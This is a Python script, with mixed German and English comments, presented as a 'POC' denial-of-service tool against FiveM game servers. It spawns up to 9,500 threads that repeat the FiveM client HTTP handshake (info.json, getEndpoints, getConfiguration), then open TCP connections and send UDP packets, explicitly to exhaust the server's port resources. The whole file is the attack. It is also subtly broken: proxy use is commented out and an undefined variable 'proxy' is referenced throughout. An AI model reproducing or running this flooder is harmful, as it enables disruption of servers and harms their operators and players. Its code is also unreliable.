import requests
import threading
import random
import sys
import uuid
import time
import socket

# Poc does a semi-full round proxied-handshake on http for the joining process,
# Exploiting the http requests for info.
# Meant to saturate the port resources without using raw tcp power.
# Next is a tcp&udp version mixed with the http to simulate a 100% real connection!

proxies = open("http.txt", "r").read().split("\n")  # Liste der HTTP-Proxies (Format: ip:port)

if len(sys.argv) != 5:
    print("FiveM - POC, Invalid usage...")
    print("IP PORT True/False <- Safe Mode time")
    exit()

def prox():
    return random.choice(proxies).strip()

def worker(ip, port, secs):
    try:
        # 1) HTTP-Session mit Proxy einrichten
        browser = requests.session()
# Keine Proxies aktivieren – direkte Verbindung
        token = str(uuid.uuid4())

        client_headers = {
            "Host": f"{ip}:{port}",
            "User-Agent": "CitizenFX",
            "Accept": "*/*"
        }
        post_data = {
            "method": "getEndpoints",
            "token": token
        }
        post_headers = {
            "Host": f"{ip}:{port}",
            "User-Agent": "CitizenFX/1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "62"
        }

        # -------------- HTTP-HANDSHAKE ----------------
        while time.time() < secs:
            # Schritt 1: GET /info.json
            client = browser.get(f"http://{ip}:{port}/info.json", headers=client_headers, timeout=5)
            if client.status_code == 200:
                print(f"(1/4) [{proxy}] -> Init Client Request!")
            else:
                if sys.argv[3].lower() == "true":
                    print(f"_FAILED_ (1/4) [{proxy}] -> Breaking Down Proxy Connection!")
                    browser.close()
                    return
                print(f"(1/4) [{proxy}] -> Init Client Request! | Skipping safe mode.")

            # Schritt 2: POST /client (getEndpoints)
            client = browser.post(f"http://{ip}:{port}/client", headers=post_headers, json=post_data, timeout=5)
            if client.status_code == 200:
                print(f"(2/4) [{proxy}] -> Posted Client Data!")
            else:
                if sys.argv[3].lower() == "true":
                    print(f"_FAILED_ (2/4) [{proxy}] -> Breaking Down Proxy Connection!")
                    browser.close()
                    return
                print(f"(2/4) [{proxy}] -> Posted Client Data! | Skipping safe mode.")

            # Schritt 3: GET /info.json (User-Agent geändert)
            client_headers["User-Agent"] = "CitizenFX/1"
            client = browser.get(f"http://{ip}:{port}/info.json", headers=client_headers, timeout=5)
            if client.status_code == 200:
                print(f"(3/4) [{proxy}] -> Init Client Request 2!")
            else:
                if sys.argv[3].lower() == "true":
                    print(f"_FAILED_ (3/4) [{proxy}] -> Breaking Down Proxy Connection!")
                    browser.close()
                    return
                print(f"(3/4) [{proxy}] -> Init Client Request 2! | Skipping safe mode.")

            # Schritt 4: POST /client (getConfiguration)
            post_data["X-CitizenFX-Token"] = token
            post_headers["User-Agent"] = "CitizenFX/1"
            post_headers["Content-Length"] = "23"
            post_data["method"] = "getConfiguration"
            client = browser.post(f"http://{ip}:{port}/client", headers=post_headers, json=post_data, timeout=5)
            if client.status_code == 200:
                print(f"(4/4) [{proxy}] -> Posted Client Data Config!")
            else:
                if sys.argv[3].lower() == "true":
                    print(f"_FAILED_ (4/4) [{proxy}] -> Breaking Down Proxy Connection!")
                    browser.close()
                    return
                print(f"(4/4) [{proxy}] -> Posted Client Data Config! | Skipping safe mode.")

            # Finaler GET /info.json (anderer User-Agent)
            client_headers["User-Agent"] = "curl/7.83.1-DEV"
            client = browser.get(f"http://{ip}:{port}/info.json", headers=client_headers, timeout=5)
            if client.status_code == 200:
                print(f"(Final HTTP) [{proxy}] -> Init Client Request Success!")
            else:
                if sys.argv[3].lower() == "true":
                    print(f"_FAILED_ (Final HTTP) [{proxy}] -> Breaking Down Proxy Connection!")
                    browser.close()
                    return
                print(f"(Final HTTP:NSM) [{proxy}] -> Init Client Request Success! | Skipping safe mode.")

            # HTTP-Handschake ist nun abgeschlossen → breche die Loop
            browser.close()
            break

        # -------------- TCP-HANDSHAKE ----------------
        try:
            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_sock.settimeout(5)
            tcp_sock.connect((ip, int(port)))
            print(f"(TCP) [{proxy}] -> TCP-Handshake erfolgreich (Connected to {ip}:{port})")
            # Optional: Daten senden, falls sinnvoll (hier nur neutraler Dummy-Byte)
            try:
                tcp_sock.send(b"\x01\x02")  # Sends two arbitrary Bytes
            except Exception:
                pass
            tcp_sock.close()
        except Exception as e:
            print(f"(TCP) [{proxy}] -> TCP-Handshake fehlgeschlagen: {e}")

        # -------------- UDP-SENDEN ----------------
        try:
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.settimeout(5)
            dummy_payload = b"\x03\x04\x05"  # Drei beliebige Bytes
            udp_sock.sendto(dummy_payload, (ip, int(port)))
            print(f"(UDP) [{proxy}] -> UDP-Dummy-Paket gesendet an {ip}:{port}")
            udp_sock.close()
        except Exception as e:
            print(f"(UDP) [{proxy}] -> UDP-Senden fehlgeschlagen: {e}")

    except Exception:
        print("__Error__ Proxy failed!")

# Haupt-Loop: Starte so viele Threads, bis das Skript beendet wird
while True:
    # Maximal 9500 gleichzeitige Threads
    while threading.active_count() >= 9500:
        pass
    threading.Thread(
        target=worker,
        args=(sys.argv[1], sys.argv[2], time.time() + int(sys.argv[4]))
    ).start()
